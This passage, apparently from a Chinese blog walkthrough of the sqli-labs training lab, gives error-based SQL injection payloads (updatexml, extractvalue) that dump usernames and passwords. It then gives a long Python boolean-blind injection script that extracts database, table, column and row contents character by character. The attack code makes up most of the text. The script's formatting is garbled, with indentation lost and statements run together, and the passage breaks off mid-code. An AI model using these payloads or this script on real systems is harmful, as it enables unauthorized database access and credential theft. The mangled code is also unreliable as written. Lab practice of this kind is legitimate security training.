updatexml(1,concat(0x7e,substr((select group_concat(id,username,password) from users),1,31),0x7e),1)--+</span><br></pre></td></tr></table></figure>\n<p>后面把 1,31 换成 32,31  和 63,31 和 94,31<br>\n<mark> 因为 substr 一次只能截取 32 个</mark></p>\n<h3 id=\"2extractvalue函数\"><a class=\"markdownIt-Anchor\" href=\"#2extractvalue函数\">#</a> 2.extractvalue 函数</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">函数原型：extractvalue(xml_document,Xpath_string)</span><br><span class=\"line\">第一个参数：xml_document是string格式，为xml文档对象的名称</span><br><span class=\"line\">第二个参数：Xpath_string是xpath格式的字符串</span><br><span class=\"line\">作用：从目标xml中返回包含所查询值的字符串</span><br></pre></td></tr></table></figure>\n<p>第二个参数若不符合 xpath 语法就会报错出信息，因此可以利用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())))--+</span><br><span class=\"line\"></span><br><span class=\"line\">?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)))--+</span><br></pre></td></tr></table></figure>\n<p><mark>但是这个函数也是最大只能截取 32 个，因此想看后面的还得要 substr 函数</mark></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27; and extractvalue(1,concat(0x7e,substr((select group_concat(id,username,password)from users),31,31)))--+</span><br></pre></td></tr></table></figure>\n<h3 id=\"less6\"><a class=\"markdownIt-Anchor\" href=\"#less6\">#</a> less6</h3>\n<p>id=1&quot; 与 less5 一样</p>\n<h3 id=\"less7\"><a class=\"markdownIt-Anchor\" href=\"#less7\">#</a> less7</h3>\n<p>布尔盲注:<br>\n 首先试探闭合情况</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;--+</span><br><span class=\"line\">1&quot;--+</span><br><span class=\"line\">1&#x27;)--+</span><br><span class=\"line\">1&#x27;))--+  这个是</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1 and (select mid((group_concat(username,0x7e,password) from users),1,1))=&#x27;D&#x27;</span><br></pre></td></tr></table></figure>\n<p>根据页面回显试探数据，可以二分法，函数:substring (),mid (),substr ()</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://sqli-labs:100/Less-7/&quot;</span> <span class=\"comment\"># 有可利用漏洞的url，根据实际情况填写</span></span><br><span class=\"line\"></span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;User-Agent&quot;</span>: <span class=\"string\">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">Safari/537.36&quot;</span>, &#125; <span class=\"comment\"># http request报文头部，根据实际情况填写</span></span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">keylist = [<span class=\"built_in\">chr</span>(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">33</span>, <span class=\"number\">127</span>)] <span class=\"comment\"># 包括数字、大小写字母、可见特殊字符</span></span><br><span class=\"line\"></span><br><span class=\"line\">flag = <span class=\"string\">&#x27;You are in&#x27;</span> <span class=\"comment\"># 用于判断附加sql语句为真的字符，根据网页回显填写</span></span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">CurrentDatabase7</span>():</span><br><span class=\"line\"></span><br><span class=\"line\">n = <span class=\"number\">10</span> <span class=\"comment\"># 预测当前数据库名称最大可能的长度，根据实际情况填写</span></span><br><span class=\"line\"></span><br><span class=\"line\">k = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">j = n // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">length = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">db = <span class=\"built_in\">str</span>()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> j &gt; k <span class=\"keyword\">and</span> j &lt; n <span class=\"keyword\">and</span> j - k&gt; <span class=\"number\">3</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">    payload1 = <span class=\"string\">&quot;1&#x27;)) and length(database())&gt;&quot;</span> + <span class=\"built_in\">str</span>(j) + <span class=\"string\">&quot;-- ss&quot;</span> <span class=\"comment\"># 所有payload根据实际情况填写</span></span><br><span class=\"line\"></span><br><span class=\"line\">    param = &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"string\">&quot;id&quot;</span>: payload1,</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    response = requests.get(url, params=param, headers=headers) <span class=\"comment\"># GET方法发送含payload的request</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># print(response.request.headers)</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># print(response.text)</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> response.text.find(flag) != -<span class=\"number\">1</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">    n = n</span><br><span class=\"line\"></span><br><span class=\"line\">    k = j</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">    k = k</span><br><span class=\"line\"></span><br><span class=\"line\">    n = j</span><br><span class=\"line\"></span><br><span class=\"line\">    j = (n - k) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">elif</span> j - k == <span class=\"number\">3</span> <span class=\"keyword\">or</span> j - k &lt; <span class=\"number\">3</span>: <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(k - <span class=\"number\">1</span>, n + <span class=\"number\">2</span>): payload2=<span class=\"string\">&quot;1&#x27;)) and length(database())=&quot;</span> + <span class=\"built_in\">str</span>(i)</span><br><span class=\"line\"></span><br><span class=\"line\">        + <span class=\"string\">&quot;-- ss&quot;</span> param=&#123; <span class=\"string\">&quot;id&quot;</span> : payload2, &#125; response=requests.get(url, params=param, headers=headers) <span class=\"keyword\">if</span></span><br><span class=\"line\"></span><br><span class=\"line\">        response.text.find(flag) !=-<span class=\"number\">1</span>: length=i <span class=\"keyword\">break</span> <span class=\"keyword\">break</span> <span class=\"keyword\">else</span>: <span class=\"keyword\">break</span> <span class=\"built_in\">print</span>(<span class=\"string\">&quot;the name of current database</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">        contains &quot;</span> + <span class=\"built_in\">str</span>(length) + <span class=\"string\">&quot; characters&quot;</span>) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, length + <span class=\"number\">1</span>): <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> keylist:</span><br><span class=\"line\"></span><br><span class=\"line\">        payload3=<span class=\"string\">&quot;1&#x27;)) and substring(database(),&quot;</span> + <span class=\"built_in\">str</span>(i) + <span class=\"string\">&quot;,1)=&#x27;&quot;</span> + c + <span class=\"string\">&quot;&#x27;-- ss&quot;</span> param=&#123; <span class=\"string\">&quot;id&quot;</span> : payload3, &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        response=requests.get(url, params=param, headers=headers) <span class=\"keyword\">if</span> response.text.find(flag) !=-<span class=\"number\">1</span>: db=db + c <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;the name of current database is &quot;</span> + <span class=\"built_in\">str</span>(db))</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Tables7</span>():</span><br><span class=\"line\"></span><br><span class=\"line\">    n = <span class=\"number\">100</span>  <span class=\"comment\"># 预测当前数据库中所有表名称最大可能的长度，根据实际情况填写</span></span><br><span class=\"line\"></span><br><span class=\"line\">    k = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">    j = n // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">    length = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">    tname = <span class=\"built_in\">str</span>()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> j &gt; k <span class=\"keyword\">and</span> j &lt; n <span class=\"keyword\">and</span> j - k &gt; <span class=\"number\">3</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">            payload4 = <span class=\"string\">&quot; 1&#x27;)) and (length((select group_concat(table_name) from information_schema.tables where</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">        table_schema=database())))&gt;&quot;</span> + <span class=\"built_in\">str</span>(</span><br><span class=\"line\"></span><br><span class=\"line\">        j) + <span class=\"string\">&quot;-- ss&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        param = &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"string\">&quot;id&quot;</span>: payload4,</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        response = requests.get(url, params=param, headers=headers)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> response.text.find(flag) != -<span class=\"number\">1</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">        n = n</span><br><span class=\"line\"></span><br><span class=\"line\">        k = j</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">        k = k</span><br><span class=\"line\"></span><br><span class=\"line\">        n = j</span><br><span class=\"line\"></span><br><span class=\"line\">        j = (n - k) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> j - k == <span class=\"number\">3</span> <span class=\"keyword\">or</span> j - k &lt; <span class=\"number\">3</span>: <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(k - <span class=\"number\">1</span>, n + <span class=\"number\">2</span>):</span><br><span class=\"line\"></span><br><span class=\"line\">            payload5=<span class=\"string\">&quot;1&#x27;)) and (length((select group_concat(table_name) from information_schema.tables where table_schema = database())))=&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">            + <span class=\"built_in\">str</span>( i) + <span class=\"string\">&quot;-- ss&quot;</span> param=&#123; <span class=\"string\">&quot;id&quot;</span> : payload5, &#125; response=requests.get(url, params=param, headers=headers) <span class=\"keyword\">if</span></span><br><span class=\"line\"></span><br><span class=\"line\">            response.text.find(flag) !=-<span class=\"number\">1</span>: length=i <span class=\"keyword\">break</span> <span class=\"keyword\">break</span> <span class=\"keyword\">else</span>: <span class=\"keyword\">break</span> <span class=\"built_in\">print</span>(<span class=\"string\">&quot;the name of all tables in current</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">            database contains &quot;</span> + <span class=\"built_in\">str</span>(length) + <span class=\"string\">&quot; characters&quot;</span>) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, length + <span class=\"number\">1</span>): <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> keylist:</span><br><span class=\"line\"></span><br><span class=\"line\">            payload6=<span class=\"string\">&quot;1&#x27;)) and substr((select group_concat(table_name) from information_schema.tables where table_schema = database()),&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">            + <span class=\"built_in\">str</span>( i) + <span class=\"string\">&quot;,1)=&#x27;&quot;</span> + c + <span class=\"string\">&quot;&#x27;-- ss&quot;</span> param=&#123; <span class=\"string\">&quot;id&quot;</span> : payload6, &#125; response=requests.get(url, params=param,</span><br><span class=\"line\"></span><br><span class=\"line\">            headers=headers) <span class=\"keyword\">if</span> response.text.find(flag) !=-<span class=\"number\">1</span>: tname=tname + c <span class=\"keyword\">break</span> <span class=\"built_in\">print</span>(<span class=\"string\">&quot;the name of all tables in</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">            current database is &quot;</span> + <span class=\"built_in\">str</span>(tname))</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Columns7</span>(<span class=\"params\">table</span>):  <span class=\"comment\"># table参数是需要爆破的数据表名称，记得加单引号</span></span><br><span class=\"line\"></span><br><span class=\"line\">    n = <span class=\"number\">200</span>  <span class=\"comment\"># 预测某个表所有列名称最大可能的长度，根据实际情况填写</span></span><br><span class=\"line\"></span><br><span class=\"line\">    k = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">    j = n // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">    length = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">    cname = <span class=\"built_in\">str</span>()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> j &gt; k <span class=\"keyword\">and</span> j &lt; n <span class=\"keyword\">and</span> j - k &gt; <span class=\"number\">3</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">            payload7 = <span class=\"string\">&quot; 1&#x27;)) and (length((select group_concat(column_name) from information_schema.columns where</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">            table_name=&#x27;&quot;</span> + table + <span class=\"string\">&quot;&#x27; and table_schema=database())))&gt;&quot;</span> + <span class=\"built_in\">str</span>(</span><br><span class=\"line\"></span><br><span class=\"line\">            j) + <span class=\"string\">&quot;-- ss&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">            param = &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"string\">&quot;id&quot;</span>: payload7,</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            response = requests.get(url, params=param, headers=headers)</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> response.text.find(flag) != -<span class=\"number\">1</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">            n = n</span><br><span class=\"line\"></span><br><span class=\"line\">            k = j</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">            k = k</span><br><span class=\"line\"></span><br><span class=\"line\">            n = j</span><br><span class=\"line\"></span><br><span class=\"line\">            j = (n - k) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">elif</span> j - k == <span class=\"number\">3</span> <span class=\"keyword\">or</span> j - k &lt; <span class=\"number\">3</span>: <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(k - <span class=\"number\">1</span>, n + <span class=\"number\">2</span>):</span><br><span class=\"line\"></span><br><span class=\"line\">                payload8=<span class=\"string\">&quot;1&#x27;)) and (length((select group_concat(column_name) from information_schema.columns where table_name = &#x27;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">                + table + <span class=\"string\">&quot;&#x27; and table_schema = database())))=&quot;</span> + <span class=\"built_in\">str</span>( i) + <span class=\"string\">&quot;-- ss&quot;</span> param=&#123; <span class=\"string\">&quot;id&quot;</span> : payload8, &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                response=requests.get(url, params=param, headers=headers) <span class=\"keyword\">if</span> response.text.find(flag) !=-<span class=\"number\">1</span>: length=i</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">break</span> <span class=\"keyword\">break</span> <span class=\"keyword\">else</span>: <span class=\"keyword\">break</span> <span class=\"built_in\">print</span>(<span class=\"string\">&quot;the name of all columns in current table contains &quot;</span> + <span class=\"built_in\">str</span>(length) + <span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">                characters&quot;</span>) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, length + <span class=\"number\">1</span>): <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> keylist:</span><br><span class=\"line\"></span><br><span class=\"line\">                payload9=<span class=\"string\">&quot;1&#x27;)) and substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">                + table + <span class=\"string\">&quot;&#x27; and table_schema = database()),&quot;</span> + <span class=\"built_in\">str</span>( i) + <span class=\"string\">&quot;,1)=&#x27;&quot;</span> + c + <span class=\"string\">&quot;&#x27;-- ss&quot;</span> param=&#123; <span class=\"string\">&quot;id&quot;</span> :</span><br><span class=\"line\"></span><br><span class=\"line\">                payload9, &#125; response=requests.get(url, params=param, headers=headers) <span class=\"keyword\">if</span> response.text.find(flag) !=-<span class=\"number\">1</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">                cname=cname + c <span class=\"keyword\">break</span> <span class=\"built_in\">print</span>(<span class=\"string\">&quot;the name of all columns in current table is &quot;</span> + <span class=\"built_in\">str</span>(cname))</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Content7</span>(<span class=\"params\">table, col1, col2</span>):  <span class=\"comment\"># table参数是需要爆破的数据表名称，col1和col2是需要爆破内容的列，记得都要加单引号</span></span><br><span class=\"line\"></span><br><span class=\"line\">    n = <span class=\"number\">200</span>  <span class=\"comment\"># 预测期望获取的数据的最大可能的长度，根据实际情况填写</span></span><br><span class=\"line\"></span><br><span class=\"line\">    k = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">    j = n // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">    length = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">    content = <span class=\"built_in\">str</span>()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> j &gt; k <span class=\"keyword\">and</span> j &lt; n <span class=\"keyword\">and</span> j - k &gt; <span class=\"number\">3</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">            payload10 = <span class=\"string\">&quot; 1&#x27;)) and (length((select group_concat(concat(&quot;</span> + col1 + <span class=\"string\">&quot;,&#x27;^&#x27;,&quot;</span> + col2 + <span class=\"string\">&quot;)) from &quot;</span> + table</span><br><span class=\"line\"></span><br><span class=\"line\">                + <span class=\"string\">&quot;)))&gt;&quot;</span> + <span class=\"built_in\">str</span>( j) + <span class=\"string\">&quot;-- ss&quot;</span> param=&#123; <span class=\"string\">&quot;id&quot;</span> : payload10, &#125; response=requests.get(url, params=param,</span><br><span class=\"line\"></span><br><span class=\"line\">                headers=headers) <span class=\"keyword\">if</span> response.text.find(flag) !=-<span class=\"number\">1</span>: n=n k=j <span class=\"keyword\">else</span>: k=k n=j j=(n - k) // <span class=\"number\">2</span> <span class=\"keyword\">elif</span> j - k==<span class=\"number\">3</span> <span class=\"keyword\">or</span></span><br><span class=\"line\"></span><br><span class=\"line\">                j - k &lt; <span class=\"number\">3</span>: <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(k - <span class=\"number\">1</span>, n + <span class=\"number\">2</span>): payload11=<span class=\"string\">&quot;1&#x27;)) and (length((select group_concat(concat(&quot;</span> +</span><br><span class=\"line\"></span><br><span class=\"line\">                col1 + <span class=\"string\">&quot;,&#x27;^&#x27;,&quot;</span> + col2 + <span class=\"string\">&quot;)) from &quot;</span> + table + <span class=\"string\">&quot;)))=&quot;</span> + <span class=\"built_in\">str</span>( i) + <span class=\"string\">&quot;-- ss&quot;</span> param=&#123; <span class=\"string\">&quot;id&quot;</span> : payload11, &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                response=requests.get(url, params=param, headers=headers) <span class=\"keyword\">if</span> response.text.find(flag) !=-<span class=\"number\">1</span>: length=i</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">break</span> <span class=\"keyword\">break</span> <span class=\"keyword\">else</span>: <span class=\"keyword\">break</span> <span class=\"built_in\">print</span>(<span class=\"string\">&quot;the content contains &quot;</span> + <span class=\"built_in\">str</span>(length) + <span class=\"string\">&quot; characters&quot;</span>) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">                length + <span class=\"number\">1</span>): <span class=\"keyword\">for</span> c <span 